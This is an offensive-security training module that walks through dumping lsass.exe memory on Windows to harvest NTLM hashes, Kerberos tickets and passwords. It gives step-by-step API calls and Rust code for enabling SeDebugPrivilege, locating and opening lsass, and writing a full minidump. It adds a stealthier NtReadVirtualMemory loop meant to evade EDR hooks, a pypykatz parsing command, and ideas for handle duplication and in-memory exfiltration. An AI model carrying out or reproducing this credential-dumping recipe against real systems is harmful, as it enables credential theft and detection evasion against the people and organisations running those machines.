# Module 22 — LSASS Dumping

## Concept

`lsass.exe` (Local Security Authority Subsystem Service) is the Windows process responsible for authenticating users and enforcing security policy. As a side effect of that job, it keeps credentials in memory:

- **NTLM hashes** — usable for Pass-the-Hash attacks (Module 24)
- **Kerberos tickets** — usable for Pass-the-Ticket and Overpass-the-Hash
- **Plaintext credentials** — in legacy configurations (WDigest enabled), cleartext passwords are cached

By dumping `lsass.exe`'s memory and parsing it offline (with Mimikatz, pypykatz, or Impacket's secretsdump), you can recover all credentials currently cached on the machine.

### Why it requires SeDebugPrivilege

`lsass.exe` runs as `NT AUTHORITY\SYSTEM`. `OpenProcess` calls against system processes are denied for normal administrators. `SeDebugPrivilege` bypasses the DACL check on process open, letting you open any process regardless of its security descriptor.

Module 20 covered enabling `SeDebugPrivilege`. It is a prerequisite for this module.

---

## Detection landscape

| Approach | How it works | Detection profile |
|---|---|---|
| `MiniDumpWriteDump` | Produces a standard `.dmp` file | Very high — kernel telemetry, ntdll hooks |
| `NtReadVirtualMemory` loop | Manual memory copy, no dbghelp.dll | Medium — suspicious API sequence, lsass handle |
| Handle duplication | Steal an existing lsass handle from another process | Low — avoids direct lsass `OpenProcess` |
| Kernel-mode dump | Direct physical memory access | Very low — requires kernel driver |

This module implements the first two approaches. Handle duplication and kernel-mode techniques are discussed but not implemented here.

---

## This module has two parts

| Part | Approach | Detection |
|---|---|---|
| A | `MiniDumpWriteDump` — the classic, simple approach | Heavily detected |
| B | `VirtualQueryEx` + `NtReadVirtualMemory` loop | More stealthy, no dbghelp.dll |

Implement Part A first to understand the goal, then Part B to understand why Part A is a bad idea in real engagements.

---

## Task

### Step 1 — Enable SeDebugPrivilege

This is identical to Module 20 Step 2. Enable the privilege on the current process token before attempting to open lsass.

```
OpenProcessToken(
    ProcessHandle: HANDLE,            // GetCurrentProcess() — the current process
    DesiredAccess: TOKEN_ACCESS_MASK, // TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
    TokenHandle: *mut HANDLE,         // out: open handle to the token
) -> Result<()>
```

```
LookupPrivilegeValueA(
    lpSystemName: PCSTR,    // PCSTR::null() — look up on the local system
    lpName: PCSTR,          // PCSTR(b"SeDebugPrivilege\0".as_ptr())
    lpLuid: *mut LUID,      // out: the LUID for SeDebugPrivilege on this system
) -> Result<()>
```

```
AdjustTokenPrivileges(
    TokenHandle: HANDLE,                   // token handle
    DisableAllPrivileges: BOOL,            // FALSE — we're enabling, not disabling all
    NewState: Option<*const TOKEN_PRIVILEGES>, // &tp — a TOKEN_PRIVILEGES with one entry
    BufferLength: u32,                     // 0 — no previous-state buffer needed
    PreviousState: Option<*mut TOKEN_PRIVILEGES>, // None
    ReturnLength: Option<*mut u32>,        // None
) -> Result<()>
```

Build `TOKEN_PRIVILEGES` as:
```rust
let tp = TOKEN_PRIVILEGES {
    PrivilegeCount: 1,
    Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
};
```

### Step 2 — Find the lsass.exe PID

Take a snapshot of all running processes and walk it until you find `lsass.exe`.

```
CreateToolhelp32Snapshot(
    dwFlags: CREATE_TOOLHELP_SNAPSHOT_FLAGS, // TH32CS_SNAPPROCESS — include all processes
    th32ProcessID: u32,                      // 0 — snapshot the whole system
) -> Result<HANDLE>
```

Walk the snapshot:
```
Process32FirstW(
    hSnapshot: HANDLE,            // snapshot handle
    lppe: *mut PROCESSENTRY32W,   // out: first entry — dwSize must be pre-set
) -> Result<()>

Process32NextW(
    hSnapshot: HANDLE,            // snapshot handle
    lppe: *mut PROCESSENTRY32W,   // out: next entry
) -> Result<()>   // Err when there are no more entries
```

`PROCESSENTRY32W.szExeFile` is a `[u16; 260]` null-terminated wide string. Compare it to `"lsass.exe"`:
```rust
let name = String::from_utf16_lossy(&entry.szExeFile);
let name = name.trim_end_matches('\0');
if name.eq_ignore_ascii_case("lsass.exe") { ... }
```

### Step 3 — Open lsass

```
OpenProcess(
    dwDesiredAccess: PROCESS_ACCESS_RIGHTS, // PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
    bInheritHandle: BOOL,                   // false — child processes don't need this handle
    dwProcessId: u32,                       // lsass_pid from step 2
) -> Result<HANDLE>                         // Err if SeDebugPrivilege not enabled
```

---

### Part A — MiniDumpWriteDump

### Step 4A — Create the output file

```
CreateFileA(
    lpFileName: PCSTR,                              // PCSTR(b"lsass.dmp\0".as_ptr())
    dwDesiredAccess: FILE_ACCESS_RIGHTS,            // FILE_GENERIC_WRITE
    dwShareMode: FILE_SHARE_MODE,                   // FILE_SHARE_NONE (0) — exclusive
    lpSecurityAttributes: Option<*const SECURITY_ATTRIBUTES>, // None
    dwCreationDisposition: FILE_CREATION_DISPOSITION, // CREATE_ALWAYS — overwrite if exists
    dwFlagsAndAttributes: FILE_FLAGS_AND_ATTRIBUTES,  // FILE_ATTRIBUTE_NORMAL
    hTemplateFile: HANDLE,                          // HANDLE::default() — no template
) -> Result<HANDLE>
```

### Step 5A — Dump with MiniDumpWriteDump

`MiniDumpWriteDump` is in `dbghelp.dll`. The `windows` crate exposes it under `Win32_System_Diagnostics_Debug`.

```
MiniDumpWriteDump(
    hProcess: HANDLE,      // hlsass — the process to dump
    ProcessId: u32,        // lsass_pid
    hFile: HANDLE,         // hfile — file to write the dump into
    DumpType: MINIDUMP_TYPE, // MiniDumpWithFullMemory — include all committed memory
    ExceptionParam: Option<*const MINIDUMP_EXCEPTION_INFORMATION>, // None — no exception context
    UserStreamParam: Option<*const MINIDUMP_USER_STREAM_INFORMATION>, // None
    CallbackParam: Option<*const MINIDUMP_CALLBACK_INFORMATION>,    // None
) -> Result<()>
```

The resulting `lsass.dmp` can be loaded in WinDbg or parsed with:
```
python3 -m pypykatz lsa minidump lsass.dmp
```

---

### Part B — NtReadVirtualMemory loop

### Step 6B — Create a second output file

Same `CreateFileA` pattern, filename `lsass_manual.bin`.

### Step 7B — Enumerate committed memory regions

```
VirtualQueryEx(
    hProcess: HANDLE,                          // hlsass
    lpAddress: Option<*const c_void>,          // current address to query (start at 0)
    lpBuffer: *mut MEMORY_BASIC_INFORMATION,   // out: info about the region at that address
    dwLength: usize,                           // mem::size_of::<MEMORY_BASIC_INFORMATION>()
) -> usize                                     // 0 means no more regions (end of address space)
```

Walk the entire address space:
```rust
let mut addr: usize = 0;
loop {
    let mut mbi = MEMORY_BASIC_INFORMATION::default();
    let ret = VirtualQueryEx(hlsass, Some(addr as *const c_void), &mut mbi, size_of::<MEMORY_BASIC_INFORMATION>());
    if ret == 0 { break; }
    if mbi.State == MEM_COMMIT { /* read this region */ }
    addr += mbi.RegionSize;  // advance to the next region
}
```

Only process regions where `mbi.State == MEM_COMMIT` — free and reserved pages have no accessible data.

### Step 8B — Read each region with NtReadVirtualMemory

`NtReadVirtualMemory` is the NT-layer equivalent of `ReadProcessMemory`. Unlike `ReadProcessMemory`, it avoids the `kernel32.dll` export and thus evades hooks on that function.

From the `ntapi` crate (`ntapi::ntpsapi::NtReadVirtualMemory`):
```
NtReadVirtualMemory(
    ProcessHandle: HANDLE,         // hlsass (as *mut c_void — ntapi uses raw pointers)
    BaseAddress: *mut c_void,      // mbi.BaseAddress — start of the region
    Buffer: *mut c_void,           // buf.as_mut_ptr() as *mut c_void
    BufferSize: usize,             // mbi.RegionSize
    NumberOfBytesRead: *mut usize, // &mut bytes_read — actual bytes copied
) -> i32 (NTSTATUS)               // 0 = STATUS_SUCCESS
```

Note: `ntapi` uses raw `HANDLE` as `*mut c_void`. Cast: `hlsass.0 as *mut c_void`.

### Step 9B — Write each region to the flat dump file

Write a simple binary format: base address (8 bytes LE), region size (8 bytes LE), raw bytes. This isn't a standard minidump but captures all memory.

```
WriteFile(
    hFile: HANDLE,                          // hdump
    lpBuffer: *const c_void,               // data pointer
    nNumberOfBytesToWrite: u32,             // byte count
    lpNumberOfBytesWritten: Option<*mut u32>, // &mut written
    lpOverlapped: Option<*const OVERLAPPED>, // None — synchronous write
) -> Result<()>
```

---

## Stealth improvements (not implemented — discuss)

**Handle duplication**: Instead of opening lsass yourself (which creates a new handle to lsass that EDR monitors), find a process that *already has* a handle to lsass (e.g., `csrss.exe`) and duplicate that handle into your process using `DuplicateHandle`. Your process never appears to open lsass directly.

**In-memory dump**: Instead of writing `lsass.dmp` to disk (where AV scans it), allocate an in-memory buffer, write the dump there, and exfiltrate it over the network. No file ever touches the filesystem.

**Custom minidump parser**: Rather than dumping all memory, walk the PEB and lsass-specific data structures to find only the credential-relevant pages, reducing the dump to kilobytes.

---

## Builds on

| Module | Skill reused |
|---|---|
| 02 | `OpenProcess`, process handle management |
| 04 | `VirtualQueryEx`-style memory enumeration |
| 07 | PE header traversal / memory region layout understanding |
| 20 | `SeDebugPrivilege` — identical step 1 |

---

## Acceptance Criteria

- [ ] `SeDebugPrivilege` is enabled before `OpenProcess` is attempted
- [ ] lsass.exe PID is correctly found via snapshot enumeration
- [ ] `OpenProcess` on lsass succeeds (no panic/error)
- [ ] **Part A**: `lsass.dmp` is written to disk and has non-zero size
- [ ] **Part A**: pypykatz or WinDbg can parse the dump file
- [ ] **Part B**: `lsass_manual.bin` is written with at least 50 regions
- [ ] All NTSTATUS returns from `NtReadVirtualMemory` are checked for `== 0`
- [ ] All Win32 handles are closed on exit
- [ ] Code runs as administrator (required for SeDebugPrivilege and lsass open)

---

## Key Types

**`PROCESSENTRY32W`** — snapshot entry for one process. Key fields: `dwSize` (must be set before first call), `th32ProcessID` (the PID), `szExeFile: [u16; 260]` (wide-char process name).

**`MEMORY_BASIC_INFORMATION`** — describes one contiguous memory region. Key fields: `BaseAddress` (*mut c_void), `RegionSize` (usize), `State` (MEM_COMMIT | MEM_FREE | MEM_RESERVE), `Protect` (page protection flags), `Type` (image/mapped/private).

**`MINIDUMP_TYPE`** — flags controlling what `MiniDumpWriteDump` includes. `MiniDumpWithFullMemory` captures all committed memory and is most useful for credential extraction.

**`TOKEN_PRIVILEGES`** — a struct with `PrivilegeCount` and a fixed-size array of `LUID_AND_ATTRIBUTES`. For a single privilege, `PrivilegeCount = 1` and only `Privileges[0]` matters. The array in Rust is `[LUID_AND_ATTRIBUTES; 1]`.

---

## Hints

- Run the binary as Administrator (or elevate it with the module 21 technique first).
- If `OpenProcess` returns access denied even after enabling `SeDebugPrivilege`, check that `AdjustTokenPrivileges` succeeded (the return value is `Result<()>`, but Windows also sets the last error — call `GetLastError` to confirm `ERROR_SUCCESS`).
- `MiniDumpWriteDump` fails with `0x8007001F` (device not ready) if the output file handle is invalid. Double-check `CreateFileA` succeeded before calling it.
- For the NtReadVirtualMemory loop, some regions will fail (guard pages, no-access pages) — that's expected. Skip failed reads (`status != 0`) rather than aborting.
- The ntapi crate's `NtReadVirtualMemory` expects `ProcessHandle` as `*mut ntapi::winapi::ctypes::c_void`. Cast with `hlsass.0 as _`.
- `VirtualQueryEx` returns 0 when `addr` exceeds the process's address space limit (typically `0x7FFFFFFFFFFF` on x64). The loop ends naturally.

---

## Submission

Paste `22-lsass-dumping/src/main.rs` and ask for a review.
